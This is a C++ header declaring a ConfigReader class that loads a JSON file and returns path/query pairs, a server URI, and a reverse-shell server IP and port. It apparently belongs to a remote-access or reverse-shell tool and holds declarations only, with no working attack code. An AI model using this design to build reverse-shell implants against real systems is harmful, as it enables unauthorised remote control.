

#ifndef CONFIGREADER_HPP
#define CONFIGREADER_HPP

#include <filesystem>
#include <string>
#include <vector>
#include "nlohmann/json.hpp"

class ConfigReader {
public:
    explicit ConfigReader(const std::filesystem::path& configFilePath);
    std::vector<std::pair<std::wstring, std::wstring>> getPathQueryPairs();
    std::string getServerUri();
    std::string getServerReverseShellIp();
    int getServerReverseShellPort();

private:
    std::filesystem::path configFilePath;
    nlohmann::json jsonObject;
    static nlohmann::json parseJsonFile(
        const std::filesystem::path& configFilePath);
};

#endif // CONFIGREADER_HPP
